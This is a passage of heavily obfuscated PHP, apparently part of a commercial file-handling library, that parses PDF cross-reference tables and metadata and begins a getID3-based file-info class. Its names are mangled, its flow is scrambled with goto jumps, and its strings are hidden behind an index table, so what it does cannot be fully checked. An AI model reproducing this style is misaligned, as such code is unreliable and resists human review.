$D™Õš¤êÜ–[1167]), $D™Õš¤êÜ–[85] => $B¾å–˜×ùÔ, $D™Õš¤êÜ–[87] => filesize($B¾å–˜×ùÔ), $D™Õš¤êÜ–[1529] => $FëÓÓµëÑ); goto b¦š¯ª‘ç; AĞğ‡”çÒ: preg_match_all($d®Ó¯ÙÉ×, $D‹Šœ¢½®[$D™Õš¤êÜ–[1530]], $f£š†åìÀŠ); if ($f£š†åìÀŠ[1] && $bİ»ÂîÊ[$D™Õš¤êÜ–[1537]] < $f£š†åìÀŠ[1][0]) { $bİ»ÂîÊ[$D™Õš¤êÜ–[1537]] = $f£š†åìÀŠ[1][0]; } preg_match_all($d®Ó¯ÙÉ×, $D‹Šœ¢½®[$D™Õš¤êÜ–[1531]], $f£š†åìÀŠ); goto EÔ³Ê™Ñ£Ò; b¦š¯ª‘ç: $D‹Šœ¢½®[$D™Õš¤êÜ–[1530]] = StreamWrapperIO::read($B¾å–˜×ùÔ, 0, $FëÓÓµëÑ); $D‹Šœ¢½®[$D™Õš¤êÜ–[1531]] = StreamWrapperIO::read($B¾å–˜×ùÔ, $D‹Šœ¢½®[$D™Õš¤êÜ–[87]] - $FëÓÓµëÑ, $FëÓÓµëÑ); $cêÉ–±¥ïâ = self::decodeXref($D‹Šœ¢½®); goto B×ğº¯÷•; B×ğº¯÷•: if ($cêÉ–±¥ïâ) { $AÈßÉÙ…ÙÇ = $cêÉ–±¥ïâ[$D™Õš¤êÜ–[1532]][$D™Õš¤êÜ–[1189]]; $bİ»ÂîÊ = self::getObjectValue($D‹Šœ¢½®, $cêÉ–±¥ïâ, $AÈßÉÙ…ÙÇ); } $bİ»ÂîÊ = is_array($bİ»ÂîÊ) ? $bİ»ÂîÊ : array(); $bİ»ÂîÊ[$D™Õš¤êÜ–[1533]] = 0; goto CĞ²‘å‹÷£; d–§‰¯•¸: preg_match($d®Ó¯ÙÉ×, $D‹Šœ¢½®[$D™Õš¤êÜ–[1531]], $f£š†åìÀŠ); if (!$bİ»ÂîÊ[$D™Õš¤êÜ–[1533]] && count($f£š†åìÀŠ) == 5) { $bİ»ÂîÊ[$D™Õš¤êÜ–[1533]] = $f£š†åìÀŠ[3]; $bİ»ÂîÊ[$D™Õš¤êÜ–[1535]] = $f£š†åìÀŠ[4]; } preg_match($D™Õš¤êÜ–[1536], $D‹Šœ¢½®[$D™Õš¤êÜ–[1530]], $f£š†åìÀŠ); goto E¯Ç‘î´õ; Aù§…â¢ƒ: } private static function parseInfoItem($dÒâÂ”÷ÃË) { $BÖÁ¼•¶ö¾ =& $_SERVER[©]; if (!$dÒâÂ”÷ÃË) { return !1; } $eååš ——‚ = array($BÖÁ¼•¶ö¾[1338] => array($BÖÁ¼•¶ö¾[1539], $BÖÁ¼•¶ö¾[43]), $BÖÁ¼•¶ö¾[1540] => array($BÖÁ¼•¶ö¾[1541], $BÖÁ¼•¶ö¾[43]), $BÖÁ¼•¶ö¾[197] => array($BÖÁ¼•¶ö¾[1542], $BÖÁ¼•¶ö¾[220]), $BÖÁ¼•¶ö¾[117] => array($BÖÁ¼•¶ö¾[1543], $BÖÁ¼•¶ö¾[220]), $BÖÁ¼•¶ö¾[1537] => array($BÖÁ¼•¶ö¾[1537], $BÖÁ¼•¶ö¾[285]), $BÖÁ¼•¶ö¾[1533] => array($BÖÁ¼•¶ö¾[1533], $BÖÁ¼•¶ö¾[285]), $BÖÁ¼•¶ö¾[1535] => array($BÖÁ¼•¶ö¾[1535], $BÖÁ¼•¶ö¾[285]), $BÖÁ¼•¶ö¾[1544] => array($BÖÁ¼•¶ö¾[1545], $BÖÁ¼•¶ö¾[43]), $BÖÁ¼•¶ö¾[1546] => array($BÖÁ¼•¶ö¾[1547], $BÖÁ¼•¶ö¾[43]), $BÖÁ¼•¶ö¾[1548] => array($BÖÁ¼•¶ö¾[1337], $BÖÁ¼•¶ö¾[43])); $Bò‚á¡…ÕÓ = array(); foreach ($eååš ——‚ as $b…Á±ŒÂ£— => $f÷ãÁšÎÕŒ) { if (!isset($dÒâÂ”÷ÃË[$f÷ãÁšÎÕŒ[0]])) { continue; } $EŒåÇâïí­ = $dÒâÂ”÷ÃË[$f÷ãÁšÎÕŒ[0]]; if (!$EŒåÇâïí­ || is_array($EŒåÇâïí­)) { continue; } switch ($f÷ãÁšÎÕŒ[1]) { case $BÖÁ¼•¶ö¾[285]: $EŒåÇâïí­ = intval($EŒåÇâïí­); break; case $BÖÁ¼•¶ö¾[220]: if (substr($EŒåÇâïí­, 0, 2) == $BÖÁ¼•¶ö¾[1549]) { $EŒåÇâïí­ = substr($EŒåÇâïí­, 2, 14); } if (strtotime($EŒåÇâïí­)) { $EŒåÇâïí­ = date($BÖÁ¼•¶ö¾[1550], strtotime($EŒåÇâïí­)); } break; } $Bò‚á¡…ÕÓ[$b…Á±ŒÂ£—] = $EŒåÇâïí­; } return $Bò‚á¡…ÕÓ; } private static function decodeXref(&$FÁ«±œÀì½) { goto càÍóÑ¦¸Á; BÎëÍ¿ÇÔ½: $a‡è¦šµ‹Ê = $f¥§¨°œ[1552]; if (!preg_match_all($a‡è¦šµ‹Ê, $C¾åŞ‰ŒÍ, $d‰ÎÜÑÜÏ±, PREG_SET_ORDER, 0)) { return !1; } $b†‚Ç•æËÅ = intval($d‰ÎÜÑÜÏ±[0][1]); goto D×’Â¾«Ã‚; càÍóÑ¦¸Á: $f¥§¨°œ =& $_SERVER[©]; $C¾åŞ‰ŒÍ = $FÁ«±œÀì½[$f¥§¨°œ[1531]]; $b™‡‰ÖÂÄ = array($f¥§¨°œ[1532] => array(), $f¥§¨°œ[1551] => array()); goto BÎëÍ¿ÇÔ½; aî™äÏÖë: if (preg_match($f¥§¨°œ[1565], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { } return $b™‡‰ÖÂÄ; goto f¢åéÍ¶Ò²; aÚ’òëéø: foreach ($d‰ÎÜÑÜÏ±[3] as $EÍ†ÃßÛœì => $f”§Ì‰Šˆ’) { if ($d‰ÎÜÑÜÏ±[3][$EÍ†ÃßÛœì] == $f¥§¨°œ[1554]) { $cØ—«Šªã‡ = $B¹–Æãí—Ì . $f¥§¨°œ[80] . intval($d‰ÎÜÑÜÏ±[2][$EÍ†ÃßÛœì]); $b™‡‰ÖÂÄ[$f¥§¨°œ[1551]][$cØ—«Šªã‡] = intval($d‰ÎÜÑÜÏ±[1][$EÍ†ÃßÛœì]); ++$B¹–Æãí—Ì; } else { if ($d‰ÎÜÑÜÏ±[3][$EÍ†ÃßÛœì] == $f¥§¨°œ[1555]) { ++$B¹–Æãí—Ì; } else { } } } if (preg_match_all($f¥§¨°œ[1556], $C¾åŞ‰ŒÍ, $d‰ÎÜÑÜÏ±)) { $aóÑÂÂäƒˆ = $FÁ«±œÀì½[$f¥§¨°œ[87]] - $FÁ«±œÀì½[$f¥§¨°œ[1529]]; foreach ($d‰ÎÜÑÜÏ±[0] as $EÍ†ÃßÛœì => $f¡ƒ†‘¡ñ) { $c™×ÇãÁˆ = $d‰ÎÜÑÜÏ±[1][$EÍ†ÃßÛœì] . $f¥§¨°œ[80] . $d‰ÎÜÑÜÏ±[2][$EÍ†ÃßÛœì]; $b™‡‰ÖÂÄ[$f¥§¨°œ[1551]][$c™×ÇãÁˆ] = strpos($C¾åŞ‰ŒÍ, $f¡ƒ†‘¡ñ) + $aóÑÂÂäƒˆ + 1; } } if (preg_match_all($f¥§¨°œ[1557], $C¾åŞ‰ŒÍ, $d‰ÎÜÑÜÏ±)) { $d¡ğ£²ÕÔÎ = count($d‰ÎÜÑÜÏ±[1]) == 1 ? $d‰ÎÜÑÜÏ±[1][0] : $d‰ÎÜÑÜÏ±[1][1]; } else { $d¡ğ£²ÕÔÎ = substr($C¾åŞ‰ŒÍ, -1024 * 5); } goto bÚ°ŒÌÙ÷Ø; FÃá±Ã Ó: if (preg_match($f¥§¨°œ[1563], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[1189]] = intval($d‰ÎÜÑÜÏ±[1]) . $f¥§¨°œ[80] . intval($d‰ÎÜÑÜÏ±[2]); } if (preg_match($f¥§¨°œ[1564], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[375]] = array(); $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[375]][0] = $d‰ÎÜÑÜÏ±[1]; $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[375]][1] = $d‰ÎÜÑÜÏ±[2]; } if (!$b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[1189]]) { return !1; } goto aî™äÏÖë; bÚ°ŒÌÙ÷Ø: if (preg_match($f¥§¨°œ[1558], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[87]] = intval($d‰ÎÜÑÜÏ±[1]); } if (preg_match($f¥§¨°œ[1559], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[1560]] = intval($d‰ÎÜÑÜÏ±[1]) . $f¥§¨°œ[80] . intval($d‰ÎÜÑÜÏ±[2]); } if (preg_match($f¥§¨°œ[1561], $d¡ğ£²ÕÔÎ, $d‰ÎÜÑÜÏ±) > 0) { $b™‡‰ÖÂÄ[$f¥§¨°œ[1532]][$f¥§¨°œ[1562]] = intval($d‰ÎÜÑÜÏ±[1]) . $f¥§¨°œ[80] . intval($d‰ÎÜÑÜÏ±[2]); } goto FÃá±Ã Ó; D×’Â¾«Ã‚: if ($FÁ«±œÀì½[$f¥§¨°œ[87]] - $b†‚Ç•æËÅ > $FÁ«±œÀì½[$f¥§¨°œ[1529]]) { $B×äõŞœãÙ = 4 * $FÁ«±œÀì½[$f¥§¨°œ[1529]]; $FÁ«±œÀì½[$f¥§¨°œ[1529]] = $B×äõŞœãÙ; $FÁ«±œÀì½[$f¥§¨°œ[1530]] = StreamWrapperIO::read($FÁ«±œÀì½[$f¥§¨°œ[85]], 0, $B×äõŞœãÙ); $FÁ«±œÀì½[$f¥§¨°œ[1531]] = StreamWrapperIO::read($FÁ«±œÀì½[$f¥§¨°œ[85]], $FÁ«±œÀì½[$f¥§¨°œ[87]] - $B×äõŞœãÙ, $B×äõŞœãÙ); $C¾åŞ‰ŒÍ = $FÁ«±œÀì½[$f¥§¨°œ[1531]]; } $B¹–Æãí—Ì = 0; preg_match_all($f¥§¨°œ[1553], $C¾åŞ‰ŒÍ, $d‰ÎÜÑÜÏ±); goto aÚ’òëéø; f¢åéÍ¶Ò²: } private static function getObjectValue($E¢²±Ï‚°, $dù“§ëÊ, $A¬„˜»œ) { goto E“ï÷À£ÇŠ; E“ï÷À£ÇŠ: $fİœ«ÓŞù =& $_SERVER[©]; $e‡«Îö‡³ì = self::getObject($E¢²±Ï‚°, $dù“§ëÊ[$fİœ«ÓŞù[1551]][$A¬„˜»œ]); if (is_string($e‡«Îö‡³ì[1])) { return $e‡«Îö‡³ì[1]; } goto cÊ¥òÒŠÄ³; F±¿ÜôÚ‹: return $f«‹‘×…Ö; goto A£¥§ôÔ°‡; cÊ¥òÒŠÄ³: if (!is_array($e‡«Îö‡³ì[1])) { return array(); } $f«‹‘×…Ö = array(); for ($Fª¢Ïó† = 0; $Fª¢Ïó† < count($e‡«Îö‡³ì[1]); $Fª¢Ïó† += 2) { $a¥Ñ«ˆ»öÁ = $e‡«Îö‡³ì[1][$Fª¢Ïó†]; $Dà”Ê¬² = $e‡«Îö‡³ì[1][$Fª¢Ïó† + 1]; if (count($a¥Ñ«ˆ»öÁ) == 3 && $a¥Ñ«ˆ»öÁ[0] == $fİœ«ÓŞù[18]) { $bÖ‚ÂÙŸ‹ = !1; if ($Dà”Ê¬²[0] == $fİœ«ÓŞù[1566]) { $Dà”Ê¬² = self::getObject($E¢²±Ï‚°, $dù“§ëÊ[$fİœ«ÓŞù[1551]][$Dà”Ê¬²[1]]); } $bÖ‚ÂÙŸ‹ = $Dà”Ê¬²[1]; if ($bÖ‚ÂÙŸ‹ === !1) { continue; } if (is_string($bÖ‚ÂÙŸ‹)) { $bÖ‚ÂÙŸ‹ = self::decodeStr($bÖ‚ÂÙŸ‹); } $f«‹‘×…Ö[$a¥Ñ«ˆ»öÁ[1]] = $bÖ‚ÂÙŸ‹; } } goto F±¿ÜôÚ‹; A£¥§ôÔ°‡: } private static function getObject($A×óÑ£±Ÿ, $FÜß²àŠŠŸ) { $aî™‘ğ¿Ç = self::getObjectItem($A×óÑ£±Ÿ, $FÜß²àŠŠŸ); $aî™‘ğ¿Ç = self::getObjectItem($A×óÑ£±Ÿ, $aî™‘ğ¿Ç[2]); return $aî™‘ğ¿Ç; } private static function getObjectItem($b«Ö²Œ‰…®, $a±›‹®æ‰¹) { goto Dˆ¤ßĞ­¯ç; Dˆ¤ßĞ­¯ç: $f—ìÇËÀ‡œ =& $_SERVER[©]; $B‰œöˆ˜é = $b«Ö²Œ‰…®[$f—ìÇËÀ‡œ[1529]]; $b‹Ù‘È‰Ÿ‚ = $b«Ö²Œ‰…®[$f—ìÇËÀ‡œ[87]] - $B‰œöˆ˜é; goto c‹ğÈ°÷‹È; BÀ ›äš¹«: $Ašò˜¾ÔõÕ = self::getRawObject($FğÂÍËßÄ·, $f¸Ü§¨ªƒ¸); if ($a±›‹®æ‰¹ >= $b‹Ù‘È‰Ÿ‚) { $Ašò˜¾ÔõÕ[2] = $Ašò˜¾ÔõÕ[2] + $b‹Ù‘È‰Ÿ‚; } else { if ($a±›‹®æ‰¹ > $B‰œöˆ˜é && $a±›‹®æ‰¹ <= $b‹Ù‘È‰Ÿ‚) { $Ašò˜¾ÔõÕ[2] = $Ašò˜¾ÔõÕ[2] + $a±›‹®æ‰¹; } } return $Ašò˜¾ÔõÕ; goto b„Ïí×¢Õ¬; c‹ğÈ°÷‹È: $f¸Ü§¨ªƒ¸ = $a±›‹®æ‰¹ >= $b‹Ù‘È‰Ÿ‚ ? $a±›‹®æ‰¹ - $b‹Ù‘È‰Ÿ‚ : $a±›‹®æ‰¹; $FğÂÍËßÄ· = $a±›‹®æ‰¹ >= $b‹Ù‘È‰Ÿ‚ ? $b«Ö²Œ‰…®[$f—ìÇËÀ‡œ[1531]] : $b«Ö²Œ‰…®[$f—ìÇËÀ‡œ[1530]]; if ($a±›‹®æ‰¹ > $B‰œöˆ˜é && $a±›‹®æ‰¹ <= $b‹Ù‘È‰Ÿ‚) { $f¸Ü§¨ªƒ¸ = 0; $FğÂÍËßÄ· = StreamWrapperIO::read($b«Ö²Œ‰…®[$f—ìÇËÀ‡œ[85]], $a±›‹®æ‰¹, $B‰œöˆ˜é); } goto BÀ ›äš¹«; b„Ïí×¢Õ¬: } private static function decodeStr($EË•ŒôÛ°ù) { goto c²†İìÏæ«; A‹ÊÓ·øø: $EË•ŒôÛ°ù = $Då³ƒ¶ÏœÂ[43]; foreach ($E£çÒ¹¿ó as $dğ×Ù ½“Ò) { if (preg_match($Då³ƒ¶ÏœÂ[1581], $dğ×Ù ½“Ò) && !1 === stripos($dğ×Ù ½“Ò, $Då³ƒ¶ÏœÂ[1582])) { $dğ×Ù ½“Ò = preg_replace($Då³ƒ¶ÏœÂ[1583], $Då³ƒ¶ÏœÂ[43], $dğ×Ù ½“Ò); $dğ×Ù ½“Ò = trim($dğ×Ù ½“Ò, $Då³ƒ¶ÏœÂ[923]); $dğ×Ù ½“Ò = pack($Då³ƒ¶ÏœÂ[1584], $dğ×Ù ½“Ò); $EË•ŒôÛ°ù .= $dğ×Ù ½“Ò; } else { $EË•ŒôÛ°ù .= $dğ×Ù ½“Ò; } } if (preg_match($Då³ƒ¶ÏœÂ[1585], $EË•ŒôÛ°ù)) { $Eº ëœ‡“ç = substr($EË•ŒôÛ°ù, 2); $EË•ŒôÛ°ù = $Då³ƒ¶ÏœÂ[43]; $AŸãÑÍ‡ÀÄ = strlen($Eº ëœ‡“ç); for ($e¨øŞ¨§Ç¶ = 0; $e¨øŞ¨§Ç¶ < $AŸãÑÍ‡ÀÄ; $e¨øŞ¨§Ç¶ += 2) { $dŠèŠĞáğ— = hexdec(bin2hex(substr($Eº ëœ‡“ç, $e¨øŞ¨§Ç¶, 2))); $EË•ŒôÛ°ù .= mb_convert_encoding($Då³ƒ¶ÏœÂ[1586] . intval($dŠèŠĞáğ—) . $Då³ƒ¶ÏœÂ[77], $Då³ƒ¶ÏœÂ[1587], $Då³ƒ¶ÏœÂ[1588]); } } goto aíÛ‚åÈ¥Ë; Cêéƒ¡‰ËÒ: $EË•ŒôÛ°ù = $Då³ƒ¶ÏœÂ[43]; foreach ($E£çÒ¹¿ó as $dğ×Ù ½“Ò) { if (preg_match($Då³ƒ¶ÏœÂ[1578], $dğ×Ù ½“Ò)) { $EË•ŒôÛ°ù .= \chr(hexdec(trim($dğ×Ù ½“Ò, $Då³ƒ¶ÏœÂ[1579]))); } else { $EË•ŒôÛ°ù .= $dğ×Ù ½“Ò; } } $E£çÒ¹¿ó = preg_split($Då³ƒ¶ÏœÂ[1580], $EË•ŒôÛ°ù, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A‹ÊÓ·øø; eÛ¿İ±¦íó: $EË•ŒôÛ°ù = $Då³ƒ¶ÏœÂ[43]; foreach ($E£çÒ¹¿ó as $dğ×Ù ½“Ò) { if (preg_match($Då³ƒ¶ÏœÂ[1576], $dğ×Ù ½“Ò)) { $EË•ŒôÛ°ù .= \chr(octdec(trim($dğ×Ù ½“Ò, $Då³ƒ¶ÏœÂ[103]))); } else { $EË•ŒôÛ°ù .= $dğ×Ù ½“Ò; } } $E£çÒ¹¿ó = preg_split($Då³ƒ¶ÏœÂ[1577], $EË•ŒôÛ°ù, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Cêéƒ¡‰ËÒ; c²†İìÏæ«: $Då³ƒ¶ÏœÂ =& $_SERVER[©]; $EË•ŒôÛ°ù = str_replace(array($Då³ƒ¶ÏœÂ[1567], $Då³ƒ¶ÏœÂ[1568], $Då³ƒ¶ÏœÂ[1569], $Då³ƒ¶ÏœÂ[1570], $Då³ƒ¶ÏœÂ[1571], $Då³ƒ¶ÏœÂ[1572], $Då³ƒ¶ÏœÂ[1573], $Då³ƒ¶ÏœÂ[1574]), array($Då³ƒ¶ÏœÂ[103], $Då³ƒ¶ÏœÂ[60], $Då³ƒ¶ÏœÂ[18], $Då³ƒ¶ÏœÂ[257], $Då³ƒ¶ÏœÂ[814], $Då³ƒ¶ÏœÂ[9], $Då³ƒ¶ÏœÂ[989], $Då³ƒ¶ÏœÂ[339]), $EË•ŒôÛ°ù); $E£çÒ¹¿ó = preg_split($Då³ƒ¶ÏœÂ[1575], $EË•ŒôÛ°ù, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eÛ¿İ±¦íó; aíÛ‚åÈ¥Ë: return $EË•ŒôÛ°ù; goto Fì‘œ¦ñŸÒ; Fì‘œ¦ñŸÒ: } private static function getRawObject($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚ = 0) { goto F…äœâ‡à¸; FÔÊÄğ›½à: $b©õù‚äÈ‚ += strspn($FÄ²Ñ’¡Êó, $a³‰ÄÑÄ¬[1589], $b©õù‚äÈ‚); $e¸ŸˆÁíµè = $FÄ²Ñ’¡Êó[$b©õù‚äÈ‚]; switch ($e¸ŸˆÁíµè) { case $a³‰ÄÑÄ¬[1590]: $D»¥‡çä¨µ = strcspn($FÄ²Ñ’¡Êó, $a³‰ÄÑÄ¬[1591], $b©õù‚äÈ‚); if ($D»¥‡çä¨µ > 0) { $b©õù‚äÈ‚ += $D»¥‡çä¨µ; return self::getRawObject($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚); } break; case $a³‰ÄÑÄ¬[18]: $bŠ‡‘Ë÷˜ = $e¸ŸˆÁíµè; ++$b©õù‚äÈ‚; $fÕ¥ÖË–÷· = preg_match($a³‰ÄÑÄ¬[1592], substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 256), $Dø¯‡µÛÄè); if (1 == $fÕ¥ÖË–÷·) { $D†ïŒ²Œ×ë = $Dø¯‡µÛÄè[1]; $b©õù‚äÈ‚ += strlen($D†ïŒ²Œ×ë); } break; case $a³‰ÄÑÄ¬[257]: case $a³‰ÄÑÄ¬[814]: $bŠ‡‘Ë÷˜ = $e¸ŸˆÁíµè; ++$b©õù‚äÈ‚; $e¥«ÃÑ‡ƒå = $b©õù‚äÈ‚; if ($a³‰ÄÑÄ¬[257] == $e¸ŸˆÁíµè) { $d‚ğ—ö« = 1; while ($d‚ğ—ö« > 0) { if (!isset($FÄ²Ñ’¡Êó[$e¥«ÃÑ‡ƒå])) { break; } $DÁŠœºÊ” = $FÄ²Ñ’¡Êó[$e¥«ÃÑ‡ƒå]; switch ($DÁŠœºÊ”) { case $a³‰ÄÑÄ¬[103]: ++$e¥«ÃÑ‡ƒå; break; case $a³‰ÄÑÄ¬[257]: ++$d‚ğ—ö«; break; case $a³‰ÄÑÄ¬[814]: --$d‚ğ—ö«; break; } ++$e¥«ÃÑ‡ƒå; } $D†ïŒ²Œ×ë = substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, $e¥«ÃÑ‡ƒå - $b©õù‚äÈ‚ - 1); $b©õù‚äÈ‚ = $e¥«ÃÑ‡ƒå; } break; case $a³‰ÄÑÄ¬[167]: case $a³‰ÄÑÄ¬[484]: $bŠ‡‘Ë÷˜ = $e¸ŸˆÁíµè; ++$b©õù‚äÈ‚; if ($a³‰ÄÑÄ¬[167] == $e¸ŸˆÁíµè) { $D†ïŒ²Œ×ë = array(); do { $b™«çò„ = $b©õù‚äÈ‚; $A­âÚ®öõ¢ = self::getRawObject($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚); $b©õù‚äÈ‚ = $A­âÚ®öõ¢[2]; $D†ïŒ²Œ×ë[] = $A­âÚ®öõ¢; } while ($a³‰ÄÑÄ¬[484] != $A­âÚ®öõ¢[0] && $b©õù‚äÈ‚ != $b™«çò„); array_pop($D†ïŒ²Œ×ë); } break; case $a³‰ÄÑÄ¬[922]: case $a³‰ÄÑÄ¬[925]: if (isset($FÄ²Ñ’¡Êó[$b©õù‚äÈ‚ + 1]) && $FÄ²Ñ’¡Êó[$b©õù‚äÈ‚ + 1] == $e¸ŸˆÁíµè) { $bŠ‡‘Ë÷˜ = $e¸ŸˆÁíµè . $e¸ŸˆÁíµè; $b©õù‚äÈ‚ += 2; if ($a³‰ÄÑÄ¬[922] == $e¸ŸˆÁíµè) { $D†ïŒ²Œ×ë = array(); do { $b™«çò„ = $b©õù‚äÈ‚; $A­âÚ®öõ¢ = self::getRawObject($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚); $b©õù‚äÈ‚ = $A­âÚ®öõ¢[2]; $D†ïŒ²Œ×ë[] = $A­âÚ®öõ¢; } while ($a³‰ÄÑÄ¬[1593] != $A­âÚ®öõ¢[0] && $b©õù‚äÈ‚ != $b™«çò„); array_pop($D†ïŒ²Œ×ë); } } else { $bŠ‡‘Ë÷˜ = $e¸ŸˆÁíµè; ++$b©õù‚äÈ‚; $fÕ¥ÖË–÷· = preg_match($a³‰ÄÑÄ¬[1594], substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚), $Dø¯‡µÛÄè); if ($a³‰ÄÑÄ¬[922] == $e¸ŸˆÁíµè && 1 == $fÕ¥ÖË–÷·) { $D†ïŒ²Œ×ë = strtr($Dø¯‡µÛÄè[1], $a³‰ÄÑÄ¬[1595], $a³‰ÄÑÄ¬[43]); $b©õù‚äÈ‚ += \strlen($Dø¯‡µÛÄè[0]); } elseif (!1 !== ($dŞöğÇæ´Æ = strpos($FÄ²Ñ’¡Êó, $a³‰ÄÑÄ¬[925], $b©õù‚äÈ‚))) { $b©õù‚äÈ‚ = $dŞöğÇæ´Æ + 1; } } break; default: if ($a³‰ÄÑÄ¬[1596] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 6)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1596]; $b©õù‚äÈ‚ += 6; } elseif ($a³‰ÄÑÄ¬[109] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 4)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[109]; $b©õù‚äÈ‚ += 4; $D†ïŒ²Œ×ë = $a³‰ÄÑÄ¬[109]; } elseif ($a³‰ÄÑÄ¬[1597] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 4)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1598]; $b©õù‚äÈ‚ += 4; $D†ïŒ²Œ×ë = $a³‰ÄÑÄ¬[1597]; } elseif ($a³‰ÄÑÄ¬[1599] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 5)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1598]; $b©õù‚äÈ‚ += 5; $D†ïŒ²Œ×ë = $a³‰ÄÑÄ¬[1599]; } elseif ($a³‰ÄÑÄ¬[1600] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 6)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1600]; $b©õù‚äÈ‚ += 6; if (1 == preg_match($a³‰ÄÑÄ¬[1601], substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚), $Dø¯‡µÛÄè)) { $b©õù‚äÈ‚ += strlen($Dø¯‡µÛÄè[0]); $DíÕ»‹«ŠÙ = $a³‰ÄÑÄ¬[1602]; $fÕ¥ÖË–÷· = preg_match($DíÕ»‹«ŠÙ, substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚), $Dø¯‡µÛÄè, PREG_OFFSET_CAPTURE); if (1 == $fÕ¥ÖË–÷·) { $D†ïŒ²Œ×ë = substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, $Dø¯‡µÛÄè[0][1]); $b©õù‚äÈ‚ += $Dø¯‡µÛÄè[1][1]; } } } elseif ($a³‰ÄÑÄ¬[1603] == substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 9)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1603]; $b©õù‚äÈ‚ += 9; } elseif (1 == preg_match($a³‰ÄÑÄ¬[1604], substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 33), $Dø¯‡µÛÄè)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1566]; $b©õù‚äÈ‚ += strlen($Dø¯‡µÛÄè[0]); $D†ïŒ²Œ×ë = intval($Dø¯‡µÛÄè[1]) . $a³‰ÄÑÄ¬[80] . intval($Dø¯‡µÛÄè[2]); } elseif (1 == preg_match($a³‰ÄÑÄ¬[1605], substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, 33), $Dø¯‡µÛÄè)) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1606]; $D†ïŒ²Œ×ë = intval($Dø¯‡µÛÄè[1]) . $a³‰ÄÑÄ¬[80] . intval($Dø¯‡µÛÄè[2]); $b©õù‚äÈ‚ += strlen($Dø¯‡µÛÄè[0]); } elseif (($FÁ°Ñ«ïŠ‰ = strspn($FÄ²Ñ’¡Êó, $a³‰ÄÑÄ¬[1607], $b©õù‚äÈ‚)) > 0) { $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[1608]; $D†ïŒ²Œ×ë = substr($FÄ²Ñ’¡Êó, $b©õù‚äÈ‚, $FÁ°Ñ«ïŠ‰); $b©õù‚äÈ‚ += $FÁ°Ñ«ïŠ‰; } break; } goto C‘¡Ñè‚Á¤; F…äœâ‡à¸: $a³‰ÄÑÄ¬ =& $_SERVER[©]; $bŠ‡‘Ë÷˜ = $a³‰ÄÑÄ¬[43]; $D†ïŒ²Œ×ë = $a³‰ÄÑÄ¬[43]; goto FÔÊÄğ›½à; C‘¡Ñè‚Á¤: return array($bŠ‡‘Ë÷˜, $D†ïŒ²Œ×ë, $b©õù‚äÈ‚); goto AéØİ‹ƒ¡’; AéØİ‹ƒ¡’: } } class GetInfo { private static $fileTypeArray; public static function get($CÁ¾èö‘İ„) { $e†—“¬· = IO::info($CÁ¾èö‘İ„); return self::infoAdd($e†—“¬·); } public static function infoAdd(&$F¨äñº¶÷’) { goto côÙ¸‚ç«Ë; AíªÒÓÛµ: $e¸× Ü›¾²[$Eóƒ²ğ»¢Ç[380]] = $bİìôğÔå; $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[434]] = $e¸× Ü›¾²; return $F¨äñº¶÷’; goto C­”İÅ¨ŞÊ; côÙ¸‚ç«Ë: $Eóƒ²ğ»¢Ç =& $_SERVER[©]; static $A¶ƒòä‰°µ; if (!$A¶ƒòä‰°µ) { require SDK_DIR . $Eóƒ²ğ»¢Ç[1609]; $A¶ƒòä‰°µ = new getID3(); } goto b‚¿µ™é…; bø‚´„¼×ê: $bİìôğÔå = $F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[170]]; try { if ($F¨äñº¶÷’[$Eóƒ²ğ»¢Ç[170]] == $Eóƒ²ğ»¢Ç[1611]) { $e¸× Ü›¾² = self::psdParse($Cî­®§ôãØ); $bİìôğÔå = $Eóƒ²ğ»¢Ç[1612]; } else { if 